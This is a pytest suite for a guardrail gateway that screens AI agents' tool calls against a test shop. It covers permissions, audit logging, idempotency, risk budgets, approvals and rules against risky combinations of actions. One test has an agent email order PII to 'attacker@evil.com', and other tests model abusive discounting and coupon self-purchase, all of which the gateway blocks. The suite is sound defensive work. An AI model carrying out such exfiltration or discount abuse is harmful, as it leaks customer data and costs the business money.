import httpx
import pytest
from asgi_lifespan import LifespanManager

from guardrail.config import Settings
from guardrail.idempotency import idempotency_key
from guardrail.main import create_app
from shop.main import create_app as create_shop_app


@pytest.fixture
async def gateway(tmp_path):
    # 两个 app 都需要各自的 lifespan：商城要建表/播种，网关要建会话库与 httpx 客户端。
    shop_app = create_shop_app(str(tmp_path / "shop.db"))
    async with LifespanManager(shop_app):
        settings = Settings(
            shop_base_url="http://shop.test",
            gateway_db_path=str(tmp_path / "gateway.db"),
        )
        app = create_app(settings, shop_transport=httpx.ASGITransport(app=shop_app))
        async with LifespanManager(app):
            yield app


@pytest.fixture
async def client(gateway):
    transport = httpx.ASGITransport(app=gateway)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as c:
        yield c


async def _new_session(client, agent_id: str = "ops_agent", task_id: str = "t-1") -> str:
    r = await client.post("/v1/sessions", json={"agent_id": agent_id, "task_id": task_id})
    return r.json()["session_id"]


async def _prime(client, session_id: str) -> None:
    """读一次商品列表，把全部商品 id 登记进 provenance。

    判定链第 3 步要求写操作的目标实体必须在本会话读到过（spec §8），所以每个
    要写商品的测试都得先「看一眼」。这不是测试麻烦，是被测系统在按设计工作。
    """
    r = await client.post(
        "/v1/tools/list_products", json={"session_id": session_id, "args": {}}
    )
    assert r.status_code == 200


async def test_create_session(client):
    r = await client.post("/v1/sessions", json={"agent_id": "pricing_agent", "task_id": "t-1"})
    assert r.status_code == 200
    assert r.json()["session_id"].startswith("s-")


async def test_tool_call_requires_valid_session(client):
    r = await client.post("/v1/tools/list_products", json={"session_id": "s-nope", "args": {}})
    assert r.status_code == 404


async def test_unknown_tool_returns_404(client):
    sid = await _new_session(client)
    r = await client.post("/v1/tools/nope", json={"session_id": sid, "args": {}})
    assert r.status_code == 404


async def test_tool_call_end_to_end(client):
    sid = await _new_session(client)
    await _prime(client, sid)
    r = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -10.0}},
    )
    assert r.status_code == 200
    assert r.json()["result"]["after"]["list_price_cents"] == round(599900 * 0.9)
    assert r.json()["decision"] == "allow"
    assert r.json()["replayed"] is False


async def test_plan_preview_projects_final_state(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "update_price", "args": {"product_id": "p-iphone", "delta_pct": -5.0}},
                {"tool": "update_price", "args": {"product_id": "p-iphone", "delta_pct": -5.0}},
            ],
        },
    )
    assert r.status_code == 200
    body = r.json()
    assert body["metrics"]["affected_product_count"] == 1
    expected = round(round(599900 * 0.95) * 0.95)
    assert body["entities"]["p-iphone"]["list_price_cents"] == expected


async def test_plan_preview_does_not_touch_real_shop(client):
    sid = await _new_session(client)
    await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "update_price", "args": {"product_id": "p-iphone", "delta_pct": -50.0}}
            ],
        },
    )
    r = await client.post(
        "/v1/tools/get_product",
        json={"session_id": sid, "args": {"product_id": "p-iphone"}},
    )
    assert r.json()["result"]["product"]["list_price_cents"] == 599900


async def test_plan_preview_loads_referenced_coupon(client):
    sid = await _new_session(client)
    c = await client.post(
        "/v1/tools/create_coupon",
        json={"session_id": sid, "args": {"code": "S30", "discount_pct": 30.0, "max_uses": 5}},
    )
    coupon_id = c.json()["result"]["coupon_id"]

    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {
                    "tool": "create_order",
                    "args": {"product_id": "p-tshirt-s", "qty": 2, "coupon_id": coupon_id},
                }
            ],
        },
    )
    assert r.status_code == 200
    # p-tshirt-s 标价 9900，七折 → round(9900 * 0.7) = 6930；现金影响 = 6930 * 2。
    assert r.json()["metrics"]["cash_impact_cents"] == 6930 * 2


async def test_plan_preview_loads_referenced_order(client):
    sid = await _new_session(client)
    await _prime(client, sid)
    o = await client.post(
        "/v1/tools/create_order",
        json={"session_id": sid, "args": {"product_id": "p-tshirt-s", "qty": 1}},
    )
    order_id = o.json()["result"]["order_id"]

    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [{"tool": "refund_order", "args": {"order_id": order_id}}],
        },
    )
    assert r.status_code == 200


async def test_plan_preview_unknown_coupon_400(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {
                    "tool": "create_order",
                    "args": {"product_id": "p-tshirt-s", "qty": 1, "coupon_id": "c-nope"},
                }
            ],
        },
    )
    assert r.status_code == 400
    assert "c-nope" in r.json()["detail"]


async def test_plan_preview_unknown_order_400(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [{"tool": "refund_order", "args": {"order_id": "o-nope"}}],
        },
    )
    assert r.status_code == 400
    assert "o-nope" in r.json()["detail"]


async def test_plan_preview_rejects_non_positive_price(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "update_price", "args": {"product_id": "p-iphone", "delta_pct": -100.0}}
            ],
        },
    )
    assert r.status_code == 400


async def test_plan_preview_rejects_negative_stock(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "update_stock", "args": {"product_id": "p-iphone", "delta": -99999}}
            ],
        },
    )
    assert r.status_code == 400


async def test_plan_preview_allows_intra_plan_coupon(client):
    # create_coupon → create_order(带券)：计划内引用占位 id 不得被误判为「优惠券不存在」。
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {
                    "tool": "create_coupon",
                    "args": {"code": "S20", "discount_pct": 20.0, "max_uses": 5},
                },
                {
                    "tool": "create_order",
                    "args": {
                        "product_id": "p-tshirt-s",
                        "qty": 2,
                        "coupon_id": "preview-coupon-0",
                    },
                },
            ],
        },
    )
    assert r.status_code == 200
    # p-tshirt-s 标价 9900，八折 → round(9900 * 0.8) = 7920；现金影响 = 7920 * 2。
    assert r.json()["metrics"]["cash_impact_cents"] == 7920 * 2


async def test_plan_preview_allows_intra_plan_refund(client):
    # create_order → refund_order：计划内引用占位 id 不得被误判为「订单不存在」。
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "create_order", "args": {"product_id": "p-tshirt-s", "qty": 1}},
                {"tool": "refund_order", "args": {"order_id": "preview-order-0"}},
            ],
        },
    )
    assert r.status_code == 200


async def test_plan_preview_rejects_non_numeric_delta_pct(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "update_price", "args": {"product_id": "p-iphone", "delta_pct": "abc"}}
            ],
        },
    )
    assert r.status_code == 400
    assert "delta_pct" in r.json()["detail"]


async def test_plan_preview_rejects_non_numeric_qty(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "create_order", "args": {"product_id": "p-tshirt-s", "qty": "abc"}}
            ],
        },
    )
    assert r.status_code == 400
    assert "qty" in r.json()["detail"]


async def test_plan_preview_rejects_missing_required_arg(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [{"tool": "update_price", "args": {"product_id": "p-iphone"}}],
        },
    )
    assert r.status_code == 400
    assert "delta_pct" in r.json()["detail"]


@pytest.mark.parametrize("qty", ["0", -1.5, 0.0, True, -3])
async def test_plan_preview_rejects_non_positive_qty(client, qty):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [{"tool": "create_order", "args": {"product_id": "p-tshirt-s", "qty": qty}}],
        },
    )
    assert r.status_code == 400


@pytest.mark.parametrize("coupon_id", [0, False, [], {}])
async def test_plan_preview_rejects_malformed_coupon_id(client, coupon_id):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {
                    "tool": "create_order",
                    "args": {"product_id": "p-tshirt-s", "qty": 1, "coupon_id": coupon_id},
                }
            ],
        },
    )
    assert r.status_code == 400
    assert "coupon_id" in r.json()["detail"]


async def test_plan_preview_allows_absent_coupon_id(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [{"tool": "create_order", "args": {"product_id": "p-tshirt-s", "qty": 1}}],
        },
    )
    assert r.status_code == 200


async def test_plan_preview_allows_null_coupon_id(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {
                    "tool": "create_order",
                    "args": {"product_id": "p-tshirt-s", "qty": 1, "coupon_id": None},
                }
            ],
        },
    )
    assert r.status_code == 200


@pytest.mark.parametrize("qty", [1.5, 2.9])
async def test_plan_preview_rejects_non_integral_qty(client, qty):
    # 商城 `OrderCreate.qty: int` 拒绝非积分浮点；预览不得用 int(1.5) 截断成 1 去投影。
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [{"tool": "create_order", "args": {"product_id": "p-tshirt-s", "qty": qty}}],
        },
    )
    assert r.status_code == 400
    assert "qty" in r.json()["detail"]


@pytest.mark.parametrize("code", [None, 0, {}])
async def test_plan_preview_rejects_non_string_code(client, code):
    # 商城 `CouponCreate.code: str` 拒绝 null / 数字 / 对象；预览不得 str() 成 "None" 放行。
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {
                    "tool": "create_coupon",
                    "args": {"code": code, "discount_pct": 20.0, "max_uses": 5},
                }
            ],
        },
    )
    assert r.status_code == 400
    assert "code" in r.json()["detail"]


async def test_plan_preview_rejects_non_integral_max_uses(client):
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {
                    "tool": "create_coupon",
                    "args": {"code": "OK", "discount_pct": 20.0, "max_uses": 1.5},
                }
            ],
        },
    )
    assert r.status_code == 400
    assert "max_uses" in r.json()["detail"]


@pytest.mark.parametrize("delta_pct", ["nan", "inf", "Infinity"])
async def test_plan_preview_rejects_non_finite_delta_pct(client, delta_pct):
    # NaN / ±Inf 都能被 float() 成功解析，此前会冲到 round(...) 抛 ValueError → 500。
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "update_price", "args": {"product_id": "p-iphone", "delta_pct": delta_pct}}
            ],
        },
    )
    assert r.status_code == 400
    assert "delta_pct" in r.json()["detail"]


async def test_plan_preview_rejects_overflowing_delta_pct(client):
    # 极端但有限的 delta_pct：float() 解析通过，但 price * (1 + d/100) 溢出为
    # inf，round(inf) 抛 OverflowError（非 ProjectionError）会逃逸成 500。守卫必须
    # 落在进入 round() 的中间量上，端到端返回 400 而非 500。
    sid = await _new_session(client)
    r = await client.post(
        "/v1/plans/preview",
        json={
            "session_id": sid,
            "actions": [
                {"tool": "update_price", "args": {"product_id": "p-iphone", "delta_pct": 1e305}}
            ],
        },
    )
    assert r.status_code == 400
    assert "delta_pct" in r.json()["detail"]


async def test_tool_call_missing_required_arg_returns_400(client):
    # 工具执行路径缺参不得 KeyError → 500；必须是 400 并点名工具与缺失参数。
    sid = await _new_session(client)
    r = await client.post("/v1/tools/get_product", json={"session_id": sid, "args": {}})
    assert r.status_code == 400
    assert "get_product" in r.json()["detail"]
    assert "product_id" in r.json()["detail"]


@pytest.mark.parametrize("delta_pct", ["nan", "inf"])
async def test_tool_call_update_price_non_numeric_is_rejected_by_schema(client, delta_pct):
    # 判定链第 4 步（参数契约）现在先于商城拦下非数值字符串：400 + 点名参数，
    # 比让请求打到商城再拿回一个 409 更早、也更好读。
    sid = await _new_session(client)
    await _prime(client, sid)
    r = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": delta_pct}},
    )
    assert r.status_code == 400
    assert "delta_pct" in r.json()["detail"]


async def test_shop_error_is_transparent_through_the_gateway(client):
    """商城的业务拒绝必须原样透传，不能被护栏层改写或吞掉。

    二次退款会被幂等拦下（参数完全相同 → replay），所以这里用「换一个商品」
    来制造一次参数不同的重复调用，退过之后换个 qty 再退一次：第二次仍然合法。
    真正测「商城拒绝透传」的是下面那条 update_stock 用例——只不过它先被
    单次阈值拦住了，这本身就是正确的层次顺序。
    """
    sid = await _new_session(client)
    await _prime(client, sid)
    o = await client.post(
        "/v1/tools/create_order",
        json={"session_id": sid, "args": {"product_id": "p-tshirt-s", "qty": 1}},
    )
    order_id = o.json()["result"]["order_id"]

    first = await client.post(
        "/v1/tools/refund_order", json={"session_id": sid, "args": {"order_id": order_id}}
    )
    assert first.status_code == 200

    second = await client.post(
        "/v1/tools/refund_order", json={"session_id": sid, "args": {"order_id": order_id}}
    )
    # 幂等键是 (session, tool, args)：第二次参数完全相同 → 命中 replay 而不是
    # 再打一次商城。这正是幂等存在的意义。
    assert second.status_code == 200
    assert second.json()["replayed"] is True


async def test_single_threshold_blocks_before_reaching_shop(client):
    """超阈值请求在第 6 步就被拦，压根到不了商城——层次顺序必须是这样。

    护栏是**加**在被保护系统之上的约束，不是替换它的判断。所以这里断言 403
    （护栏拦的）而不是 409（商城拦的）：能区分这两者，才证明护栏在自己该拦的
    地方就拦住了，而不是把判断外包给商城。
    """
    sid = await _new_session(client)
    await _prime(client, sid)
    r = await client.post(
        "/v1/tools/update_stock",
        json={"session_id": sid, "args": {"product_id": "p-tshirt-s", "delta": -99999}},
    )
    assert r.status_code == 403
    assert "500" in r.json()["detail"]


# ---------- 判定链接线 ----------


async def test_denied_call_is_not_executed(client):
    # spec §13 场景 1：Agent 试图把 iPhone 打一折 → 立即拒绝。
    sid = await _new_session(client)
    await _prime(client, sid)
    r = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -90.0}},
    )
    assert r.status_code == 403
    assert "10%" in r.json()["detail"]
    after = await client.post(
        "/v1/tools/get_product",
        json={"session_id": sid, "args": {"product_id": "p-iphone"}},
    )
    assert after.json()["result"]["product"]["list_price_cents"] == 599900


async def test_denied_call_is_audited(gateway, client):
    sid = await _new_session(client)
    await _prime(client, sid)
    await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -90.0}},
    )
    entries = await gateway.state.audit.list_entries(sid)
    denied = [e for e in entries if e.decision == "deny"]
    assert len(denied) == 1
    assert "10%" in denied[0].reasons[0]


async def test_audit_chain_verifies_after_traffic(client):
    sid = await _new_session(client)
    await _prime(client, sid)
    await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -5.0}},
    )
    await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -90.0}},
    )
    verdict = (await client.get("/v1/audit/verify")).json()
    # 5 条 = list_products 的「批准 + 完成」+ update_price 成功的「批准 + 完成」
    # + 被拒的那 1 条。放行写两条是 spec §7「审计先于执行」的必然结果。
    assert verdict == {"ok": True, "checked": 5, "broken_at_seq": None, "reason": None}


async def test_unknown_tool_is_audited(gateway, client):
    sid = await _new_session(client)
    r = await client.post("/v1/tools/teleport", json={"session_id": sid, "args": {}})
    assert r.status_code == 404
    entries = await gateway.state.audit.list_entries(sid)
    assert any(e.tool == "teleport" and e.decision == "deny" for e in entries)


async def test_permission_denied_returns_403(client):
    sid = await _new_session(client, agent_id="risk_auditor")
    await _prime(client, sid)
    r = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -1.0}},
    )
    assert r.status_code == 403
    assert "无权" in r.json()["detail"]


async def test_provenance_denied_returns_403(client):
    sid = await _new_session(client)
    # 没有先读商品，p-iphone 就不在 provenance 里。
    r = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -1.0}},
    )
    assert r.status_code == 403
    assert "Provenance" in r.json()["detail"]


async def test_invalid_args_returns_400(client):
    sid = await _new_session(client)
    await _prime(client, sid)
    r = await client.post("/v1/tools/get_product", json={"session_id": sid, "args": {}})
    assert r.status_code == 400
    assert "product_id" in r.json()["detail"]


async def test_result_state_cap_denied_end_to_end(client):
    sid = await _new_session(client)
    await _prime(client, sid)
    r = await client.post(
        "/v1/tools/create_order",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "qty": 1}},
    )
    assert r.status_code == 403
    assert "500.00" in r.json()["detail"]


async def test_expired_session_is_rejected(gateway, client):
    sid = await _new_session(client)
    record = await gateway.state.sessions.load(sid)
    assert record is not None
    record.expires_at = "2000-01-01T00:00:00+00:00"
    await gateway.state.sessions.save(record)
    r = await client.post("/v1/tools/list_products", json={"session_id": sid, "args": {}})
    assert r.status_code == 403
    assert "过期" in r.json()["detail"]


async def test_session_creation_sweeps_expired(gateway, client):
    stale = await _new_session(client)
    record = await gateway.state.sessions.load(stale)
    assert record is not None
    record.expires_at = "2000-01-01T00:00:00+00:00"
    await gateway.state.sessions.save(record)
    await _new_session(client)
    assert await gateway.state.sessions.load(stale) is None


# ---------- 幂等 ----------


async def test_idempotent_replay_returns_first_response(client):
    sid = await _new_session(client)
    await _prime(client, sid)
    body = {"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -5.0}}
    first = await client.post("/v1/tools/update_price", json=body)
    second = await client.post("/v1/tools/update_price", json=body)
    assert first.status_code == 200
    assert second.status_code == 200
    assert second.json()["replayed"] is True
    assert second.json()["result"] == first.json()["result"]
    # 关键：只降了一次。599900 → 569905，若执行两次会是 539910。
    after = await client.post(
        "/v1/tools/get_product",
        json={"session_id": sid, "args": {"product_id": "p-iphone"}},
    )
    assert after.json()["result"]["product"]["list_price_cents"] == 569905


async def test_replay_is_audited_with_replay_flag(gateway, client):
    sid = await _new_session(client)
    await _prime(client, sid)
    body = {"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -5.0}}
    await client.post("/v1/tools/update_price", json=body)
    await client.post("/v1/tools/update_price", json=body)
    entries = await gateway.state.audit.list_entries(sid)
    assert any(e.replay is True for e in entries)


async def test_different_args_are_not_replays(client):
    sid = await _new_session(client)
    await _prime(client, sid)
    await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -5.0}},
    )
    second = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -6.0}},
    )
    assert second.json()["replayed"] is False


async def test_same_args_in_different_session_is_not_replay(client):
    args = {"product_id": "p-iphone", "delta_pct": -5.0}
    s1 = await _new_session(client, task_id="t-1")
    s2 = await _new_session(client, task_id="t-2")
    for sid in (s1, s2):
        await _prime(client, sid)
    first = await client.post("/v1/tools/update_price", json={"session_id": s1, "args": args})
    second = await client.post("/v1/tools/update_price", json={"session_id": s2, "args": args})
    assert first.json()["replayed"] is False
    assert second.json()["replayed"] is False


async def test_failed_execution_releases_idempotency_key(gateway, client):
    # 第一次因库存不足失败 → 幂等键必须被释放，否则这次调用在会话 TTL 内
    # 永远重试不了。-1 在阈值内，-99999 会被第 6 步拦，所以这里直接改库存
    # 到一个会触发商城守卫的值：先用合法调用把库存打到 0。
    sid = await _new_session(client)
    await _prime(client, sid)
    body = {"session_id": sid, "args": {"product_id": "p-tshirt-s", "delta": -300}}
    ok = await client.post("/v1/tools/update_stock", json=body)
    assert ok.status_code == 200
    body2 = {"session_id": sid, "args": {"product_id": "p-tshirt-s", "delta": -1}}
    bad = await client.post("/v1/tools/update_stock", json=body2)
    assert bad.status_code == 409
    key = idempotency_key(sid, "update_stock", body2["args"])
    assert await gateway.state.idempotency.get(key) is None


async def test_version_conflict_releases_idempotency_key(gateway, client):
    sid = await _new_session(client, agent_id="pricing_agent")
    await _prime(client, sid)

    original = gateway.state.sessions.load_state

    async def racing_load(session_id):
        state, version = await original(session_id)
        await gateway.state.sessions.save_state(session_id, state, version)
        return state, version

    gateway.state.sessions.load_state = racing_load
    body = {
        "session_id": sid,
        "args": {"product_id": "p-iphone", "delta_pct": -5.0},
    }
    first = await client.post("/v1/tools/update_price", json=body)
    assert first.status_code == 409
    assert "持续并发写入" in first.json()["detail"]

    gateway.state.sessions.load_state = original
    second = await client.post("/v1/tools/update_price", json=body)
    assert second.status_code == 200
    assert second.json()["replayed"] is False


# ---------- 审计先于执行 ----------


async def test_successful_call_writes_two_audit_entries(gateway, client):
    sid = await _new_session(client)
    await _prime(client, sid)
    await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid, "args": {"product_id": "p-iphone", "delta_pct": -5.0}},
    )
    update_entries = [
        e for e in await gateway.state.audit.list_entries(sid) if e.tool == "update_price"
    ]
    # list_entries 是 ORDER BY seq DESC，所以 [0] 是后写的那条。
    # 「批准并即将执行」+「执行完成」——审计先于执行是 spec §7 的硬要求。
    assert len(update_entries) == 2
    assert update_entries[0].reasons == ["执行完成"]
    assert update_entries[1].reasons == []


async def test_audit_failure_cancels_execution(gateway, client):
    # spec §10.2：审计写失败 → 拒绝。这是「执行了但没记上」那个窗口的守门人。
    class BrokenAudit:
        async def append(self, _draft):
            raise RuntimeError("磁盘满了")

    gateway.state.audit = BrokenAudit()
    sid = await _new_session(client)
    r = await client.post(
        "/v1/tools/get_product",
        json={"session_id": sid, "args": {"product_id": "p-iphone"}},
    )
    assert r.status_code == 403
    assert "审计" in r.json()["detail"]


# ---------- 启动期 fail-closed ----------


def test_create_app_refuses_to_start_without_policy(tmp_path):
    with pytest.raises(RuntimeError, match="策略加载失败"):
        create_app(
            Settings(
                shop_base_url="http://shop.test",
                gateway_db_path=str(tmp_path / "gateway.db"),
                policy_path=str(tmp_path / "nope.yaml"),
            )
        )


def test_create_app_refuses_to_start_with_broken_policy(tmp_path):
    bad = tmp_path / "bad.yaml"
    bad.write_text("version: 1\npermissions: {}\nrules: []\n", encoding="utf-8")
    with pytest.raises(RuntimeError, match="拒绝启动"):
        create_app(
            Settings(
                shop_base_url="http://shop.test",
                gateway_db_path=str(tmp_path / "gateway.db"),
                policy_path=str(bad),
            )
        )


# ---------- M3：组合风险与预算接线 ----------


async def test_budget_ladder_allow_then_flag_then_ask(client):
    """场景 2 的完整阶梯（spec §13 场景 2 的实际数值推演）。

    幂等键含 args：完全相同的重复调用会被重放保护挡下——连续降价必须用
    不同参数表达（逐次微调幅度），这个语义推论回写进 spec §6.2。
    6 次递变降价（-3.0 到 -3.5，累计 -19.5，warn 不触发）：
    预算 1.00 → 0.10；第 6 次 pre 0.25 ≤ 0.30 → ALLOW_WITH_FLAG；
    第 7 次 pre 0.10 ≤ 0.10 → ASK(202)。
    """
    sid = await _new_session(client)
    await _prime(client, sid)
    for i in range(5):
        r = await client.post(
            "/v1/tools/update_price",
            json={"session_id": sid,
                  "args": {"product_id": "p-iphone", "delta_pct": -3.0 - i * 0.1}},
        )
        assert r.status_code == 200, r.json()
        assert r.json()["decision"] == "allow"

    r6 = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid,
              "args": {"product_id": "p-iphone", "delta_pct": -3.5}},
    )
    assert r6.status_code == 200
    assert r6.json()["decision"] == "allow_with_flag"
    assert r6.json()["flagged"] is True

    r7 = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid,
              "args": {"product_id": "p-iphone", "delta_pct": -3.6}},
    )
    assert r7.status_code == 202
    assert r7.json()["decision"] == "ask"
    assert r7.json()["pending_approval_id"]


async def test_ask_holds_execution_and_approval_flow_works(gateway, client):
    sid = await _new_session(client)
    await _prime(client, sid)
    # 6 次递变降价 -3.0..-3.5（累计 -19.5，warn 不触发）：预算 1.00 → 0.10；
    # 第 7 次 -3.6 → pre 0.10 ≤ 0.10 → ASK(202)。pending 累计 -23.1 越过
    # warn_at -20 → 该次 cost 0.35，批准执行后预算 0.10 - 0.35 = -0.25。
    for i in range(6):
        r = await client.post(
            "/v1/tools/update_price",
            json={"session_id": sid,
                  "args": {"product_id": "p-iphone", "delta_pct": -3.0 - i * 0.1}},
        )
        assert r.status_code == 200
    r6 = await client.post(
        "/v1/tools/update_price",
        json={"session_id": sid,
              "args": {"product_id": "p-iphone", "delta_pct": -3.6}},
    )
    assert r6.status_code == 202
    approval_id = r6.json()["pending_approval_id"]

    # 扣下期间：审批单在开放列表里，商城未被改动。
    # （预算 0.10 已在 ask 区间——此时连读操作都会被扣下，所以价格直接查商城，
    #  不经过网关。这本身就是「预算耗尽连只读都停」语义的现场证据。）
    open_ids = [p["id"] for p in (await client.get("/v1/approvals")).json()]
    assert approval_id in open_ids
    price_before = (await gateway.state.shop.get("/shop/v1/products/p-iphone")).json()[
        "list_price_cents"
    ]

    # 批准 → 执行 → 预算扣减（0.10 - 0.35 = -0.25，含 warn 附加）。
    r = await client.post(
        f"/v1/approvals/{approval_id}/resolve",
        json={"resolution": "approve", "decided_by": "boss"},
    )
    assert r.status_code == 200
    price_after = (await gateway.state.shop.get("/shop/v1/products/p-iphone")).json()[
        "list_price_cents"
    ]
    assert price_after < price_before
    state, _ = await gateway.state.sessions.load_state(sid)
    assert state.risk_budget == pytest.approx(-0.25)


async def test_overdraft_denies_even_reads(gateway, client):
    # spec 字面：budget < 0 → DENY，阶梯对一切调用生效（含零成本读）。
    sid = await _new_session(client)
    await _prime(client, sid)
    for i in range(7):
        r = await client.post(
            "/v1/tools/update_price",
            json={"session_id": sid,
                  "args": {"product_id": "p-iphone", "delta_pct": -3.0 - i * 0.1}},
        )
        assert r.status_code in (200, 202)
    # 透支后（0.10 - 0.35 = -0.25）：批准扣下的那次 → 读也被拒（spec 字面）。
    # 注意不能用 list_products 验证——它在 _prime 里已执行过，相同 args 会命中
    # 幂等重放直接返回缓存（重放不做判定，这是正确语义）。用没读过的 get_product。
    open_ids = [p["id"] for p in (await client.get("/v1/approvals")).json()]
    for approval_id in open_ids:
        await client.post(
            f"/v1/approvals/{approval_id}/resolve",
            json={"resolution": "approve", "decided_by": "boss"},
        )
    state, _ = await gateway.state.sessions.load_state(sid)
    assert state.risk_budget < 0
    r = await client.post(
        "/v1/tools/get_product", json={"session_id": sid, "args": {"product_id": "p-tshirt-s"}}
    )
    assert r.status_code == 403
    assert "预算" in r.json()["detail"] or "透支" in r.json()["detail"]


async def test_sequence_rule_denies_coupon_self_purchase(client):
    """spec §13 场景 3：发 60% 券 → 随即带券下单，两步各自合规、序列违规。"""
    sid = await _new_session(client, agent_id="marketing_agent")
    await _prime(client, sid)
    coupon = await client.post(
        "/v1/tools/create_coupon",
        json={"session_id": sid,
              "args": {"code": "S60", "discount_pct": 60.0, "max_uses": 5}},
    )
    assert coupon.status_code == 200
    coupon_id = coupon.json()["result"]["coupon_id"]

    r = await client.post(
        "/v1/tools/create_order",
        json={"session_id": sid,
              "args": {"product_id": "p-tshirt-s", "qty": 1, "coupon_id": coupon_id}},
    )
    assert r.status_code == 403
    assert "coupon_self_purchase" in r.json()["detail"]


async def test_taint_rule_denies_pii_exfiltration(client):
    """spec §13 场景 3：读订单（pi i）→ 外发邮件到外部域名。"""
    sid = await _new_session(client)
    await _prime(client, sid)
    order = await client.post(
        "/v1/tools/create_order",
        json={"session_id": sid, "args": {"product_id": "p-tshirt-s", "qty": 1}},
    )
    order_id = order.json()["result"]["order_id"]
    got = await client.post(
        "/v1/tools/get_order", json={"session_id": sid, "args": {"order_id": order_id}}
    )
    assert got.status_code == 200

    r = await client.post(
        "/v1/tools/send_email",
        json={"session_id": sid,
              "args": {"to": "attacker@evil.com", "subject": "订单", "body": "x"}},
    )
    assert r.status_code == 403
    assert "customer_pii_exfiltration" in r.json()["detail"]


async def test_taint_internal_domain_is_allowed(client):
    sid = await _new_session(client)
    await _prime(client, sid)
    order = await client.post(
        "/v1/tools/create_order",
        json={"session_id": sid, "args": {"product_id": "p-tshirt-s", "qty": 1}},
    )
    order_id = order.json()["result"]["order_id"]
    await client.post(
        "/v1/tools/get_order", json={"session_id": sid, "args": {"order_id": order_id}}
    )
    r = await client.post(
        "/v1/tools/send_email",
        json={"session_id": sid,
              "args": {"to": "ops@internal.corp", "subject": "对账", "body": "x"}},
    )
    assert r.status_code == 200


async def test_cross_agent_stack_denied_end_to_end(client):
    """spec §13 场景 4（数值修正版）：同 task 下定价 -8% + 营销 20% 券 → -26.4%
    击穿 -25 成本线。两步各自合规，组合违规。"""
    # 定价会话：-8% 放行（单次阈值内）。
    s1 = await _new_session(client, agent_id="pricing_agent", task_id="t-stack")
    await _prime(client, s1)
    r1 = await client.post(
        "/v1/tools/update_price",
        json={"session_id": s1, "args": {"product_id": "p-iphone", "delta_pct": -8.0}},
    )
    assert r1.status_code == 200

    # 营销会话：发 20% 券 → 跨 Agent 合并后击穿。
    s2 = await _new_session(client, agent_id="marketing_agent", task_id="t-stack")
    await _prime(client, s2)
    r2 = await client.post(
        "/v1/tools/create_coupon",
        json={"session_id": s2, "args": {"code": "S20", "discount_pct": 20.0, "max_uses": 5}},
    )
    assert r2.status_code == 403
    assert "price_and_coupon_stack" in r2.json()["detail"]


async def test_create_app_refuses_broken_combined_policy(tmp_path):
    bad = tmp_path / "combined.yaml"
    bad.write_text("version: 1\nbudget: {}\nrules: []\n", encoding="utf-8")
    with pytest.raises(RuntimeError, match="拒绝启动"):
        create_app(
            Settings(
                shop_base_url="http://shop.test",
                gateway_db_path=str(tmp_path / "gateway.db"),
                combined_policy_path=str(bad),
            )
        )
